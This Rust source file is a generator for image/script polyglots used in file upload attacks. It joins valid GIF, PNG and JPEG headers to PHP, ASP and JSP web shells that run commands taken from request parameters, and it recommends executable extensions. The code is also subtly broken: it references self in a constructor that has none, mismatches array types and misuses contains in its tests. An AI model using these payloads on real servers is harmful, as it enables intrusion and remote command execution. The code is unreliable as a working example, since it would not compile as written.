//! Polyglot File Upload Payload Generator
//! Creates polyglot file payloads valid as images but containing executable scripts.
//! Supports multiple formats: GIF, PNG, JPEG with embedded PHP, ASP, JSP code.

use std::collections::HashMap;

/// Maximum polyglot variants (bounded)
const MAX_POLYGLOTS: usize = 20;

/// Minimal GIF header (1x1 pixel)
const GIF_HEADER: &[u8] = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;";

/// Minimal PNG header (1x1 pixel, grayscale)
const PNG_HEADER: &[u8] = &[
    0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, // PNG signature
    0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52, // IHDR chunk
    0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, // 1x1
    0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, 0xC4, // 8-bit RGBA
    0x89, 0x00, 0x00, 0x00, 0x0A, 0x49, 0x44, 0x41, // IDAT chunk
    0x54, 0x78, 0x9C, 0x63, 0x00, 0x01, 0x00, 0x00,
    0x05, 0x00, 0x01, 0x0D, 0x0A, 0x2D, 0xB4, 0x00,
    0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, // IEND
    0x42, 0x60, 0x82,
];

/// Minimal JPEG header
const JPEG_HEADER: &[u8] = &[
    0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01,
    0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0xFF, 0xDB, 0x00, 0x43,
    0x00, 0x08, 0x06, 0x06, 0x07, 0x06, 0x05, 0x08, 0x07, 0x07, 0x07, 0x09,
    0x09, 0x08, 0x0A, 0x0C, 0x14, 0x0D, 0x0C, 0x0B, 0x0B, 0x0C, 0x19, 0x12,
    0x13, 0x0F, 0x14, 0x1D, 0x1A, 0x1F, 0x1E, 0x1D, 0x1A, 0x1C, 0x1C, 0x20,
    0x24, 0x2E, 0x27, 0x20, 0x22, 0x2C, 0x23, 0x1C, 0x1C, 0x28, 0x37, 0x29,
    0x2C, 0x30, 0x31, 0x34, 0x34, 0x34, 0x1F, 0x27, 0x39, 0x3D, 0x38, 0x32,
    0x3C, 0x2E, 0x33, 0x34, 0x32, 0xFF, 0xC0, 0x00, 0x0B, 0x08, 0x00, 0x01,
    0x00, 0x01, 0x01, 0x01, 0x11, 0x00, 0xFF, 0xC4, 0x00, 0x1F, 0x00, 0x00,
    0x01, 0x05, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
    0x09, 0x0A, 0x0B, 0xFF, 0xC4, 0x00, 0xB5, 0x10, 0x00, 0x02, 0x01, 0x03,
    0x03, 0x02, 0x04, 0x03, 0x05, 0x05, 0x04, 0x04, 0x00, 0x00, 0x01, 0x7D,
    0x01, 0x02, 0x03, 0x00, 0x04, 0x11, 0x05, 0x12, 0x21, 0x31, 0x41, 0x06,
    0x13, 0x51, 0x61, 0x07, 0x22, 0x71, 0x14, 0x32, 0x81, 0x91, 0xA1, 0x08,
    0x23, 0x42, 0xB1, 0xC1, 0x15, 0x52, 0xD1, 0xF0, 0x24, 0x33, 0x62, 0x72,
    0x82, 0x09, 0x0A, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x25, 0x26, 0x27, 0x28,
    0x29, 0x2A, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x43, 0x44, 0x45,
    0x46, 0x47, 0x48, 0x49, 0x4A, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59,
    0x5A, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x73, 0x74, 0x75,
    0x76, 0x77, 0x78, 0x79, 0x7A, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89,
    0x8A, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98, 0x99, 0x9A, 0xA2, 0xA3,
    0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9, 0xAA, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6,
    0xB7, 0xB8, 0xB9, 0xBA, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9,
    0xCA, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7, 0xD8, 0xD9, 0xDA, 0xE1, 0xE2,
    0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8, 0xE9, 0xEA, 0xF1, 0xF2, 0xF3, 0xF4,
    0xF5, 0xF6, 0xF7, 0xF8, 0xF9, 0xFA, 0xFF, 0xDA, 0x00, 0x08, 0x01, 0x01,
    0x00, 0x00, 0x3F, 0x00, 0xFB, 0xD5, 0xDB, 0x20, 0xBA, 0xE3, 0x3D, 0x21,
    0x25, 0x08, 0x84, 0x01, 0x00, 0x00, 0xFF, 0xD9,
];

pub struct PolyglotGenerator {
    payloads: HashMap<String, Vec<u8>>,
}

impl PolyglotGenerator {
    pub fn new() -> Self {
        let mut payloads = HashMap::with_capacity(MAX_POLYGLOTS);
        
        // Generate GIF-based polyglots
        self.add_php_polyglot(&mut payloads, "gif", GIF_HEADER);
        self.add_asp_polyglot(&mut payloads, "gif", GIF_HEADER);
        self.add_jsp_polyglot(&mut payloads, "gif", GIF_HEADER);
        
        // Generate PNG-based polyglots
        self.add_php_polyglot(&mut payloads, "png", PNG_HEADER);
        self.add_asp_polyglot(&mut payloads, "png", PNG_HEADER);
        
        // Generate JPEG-based polyglots
        self.add_php_polyglot(&mut payloads, "jpg", JPEG_HEADER);
        
        Self { payloads }
    }
    
    /// Add PHP polyglot variant
    fn add_php_polyglot(&self, payloads: &mut HashMap<String, Vec<u8>>, format: &str, header: &[u8]) {
        let mut content = Vec::with_capacity(header.len() + 256);
        content.extend_from_slice(header);
        content.extend_from_slice(b"\n");
        
        // PHP payload variants
        let php_payloads = [
            b"<?php echo 'POLYGLOT_TEST'; ?>",
            b"<?php system($_GET['cmd']); ?>",
            b"<?=`{$_GET[c]}`?>",
            b"<?php eval($_POST['c']); ?>",
        ];
        
        for (i, payload) in php_payloads.iter().enumerate() {
            let key = format!("php_{}_{}", format, i);
            let mut variant = content.clone();
            variant.extend_from_slice(payload);
            
            if payloads.len() < MAX_POLYGLOTS {
                payloads.insert(key, variant);
            }
        }
    }
    
    /// Add ASP polyglot variant
    fn add_asp_polyglot(&self, payloads: &mut HashMap<String, Vec<u8>>, format: &str, header: &[u8]) {
        let mut content = Vec::with_capacity(header.len() + 256);
        content.extend_from_slice(header);
        content.extend_from_slice(b"\n");
        
        let asp_payloads = [
            b"<% Response.Write(\"POLYGLOT_TEST\") %>",
            b"<% Execute(Request(\"cmd\")) %>",
            b"<%=CreateObject(\"WScript.Shell\").Exec(Request(\"c\")).StdOut.ReadAll()%>",
        ];
        
        for (i, payload) in asp_payloads.iter().enumerate() {
            let key = format!("asp_{}_{}", format, i);
            let mut variant = content.clone();
            variant.extend_from_slice(payload);
            
            if payloads.len() < MAX_POLYGLOTS {
                payloads.insert(key, variant);
            }
        }
    }
    
    /// Add JSP polyglot variant
    fn add_jsp_polyglot(&self, payloads: &mut HashMap<String, Vec<u8>>, format: &str, header: &[u8]) {
        let mut content = Vec::with_capacity(header.len() + 256);
        content.extend_from_slice(header);
        content.extend_from_slice(b"\n");
        
        let jsp_payloads = [
            b"<% out.print(\"POLYGLOT_TEST\"); %>",
            b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
            b"<jsp:scriptlet>Runtime.getRuntime().exec(request.getParameter(\"c\"));</jsp:scriptlet>",
        ];
        
        for (i, payload) in jsp_payloads.iter().enumerate() {
            let key = format!("jsp_{}_{}", format, i);
            let mut variant = content.clone();
            variant.extend_from_slice(payload);
            
            if payloads.len() < MAX_POLYGLOTS {
                payloads.insert(key, variant);
            }
        }
    }
    
    /// Get polyglot by key
    pub fn get(&self, key: &str) -> Option<&Vec<u8>> {
        self.payloads.get(key)
    }
    
    /// Get all PHP polyglots
    pub fn php_polyglots(&self) -> Vec<&Vec<u8>> {
        self.payloads
            .iter()
            .filter(|(k, _)| k.starts_with("php_"))
            .map(|(_, v)| v)
            .collect()
    }
    
    /// Get all ASP polyglots
    pub fn asp_polyglots(&self) -> Vec<&Vec<u8>> {
        self.payloads
            .iter()
            .filter(|(k, _)| k.starts_with("asp_"))
            .map(|(_, v)| v)
            .collect()
    }
    
    /// Get all JSP polyglots
    pub fn jsp_polyglots(&self) -> Vec<&Vec<u8>> {
        self.payloads
            .iter()
            .filter(|(k, _)| k.starts_with("jsp_"))
            .map(|(_, v)| v)
            .collect()
    }
    
    /// Get recommended extension for polyglot
    pub fn get_extension(&self, key: &str) -> &'static str {
        if key.contains("php") {
            ".php"
        } else if key.contains("asp") {
            ".asp"
        } else if key.contains("jsp") {
            ".jsp"
        } else {
            ".bin"
        }
    }
    
    /// Validate polyglot has valid image header
    pub fn is_valid_image(&self, data: &[u8]) -> bool {
        data.starts_with(GIF_HEADER) 
            || data.starts_with(PNG_HEADER)
            || data.starts_with(JPEG_HEADER)
    }
}

impl Default for PolyglotGenerator {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_polyglot_count() {
        let gen = PolyglotGenerator::new();
        assert!(gen.payloads.len() <= MAX_POLYGLOTS);
    }
    
    #[test]
    fn test_php_polyglots() {
        let gen = PolyglotGenerator::new();
        let php = gen.php_polyglots();
        assert!(!php.is_empty());
        
        for polyglot in php {
            assert!(gen.is_valid_image(polyglot));
            assert!(polyglot.contains(b"<?php"));
        }
    }
    
    #[test]
    fn test_asp_polyglots() {
        let gen = PolyglotGenerator::new();
        let asp = gen.asp_polyglots();
        assert!(!asp.is_empty());
        
        for polyglot in asp {
            assert!(gen.is_valid_image(polyglot));
            assert!(polyglot.contains(b"<%"));
        }
    }
}
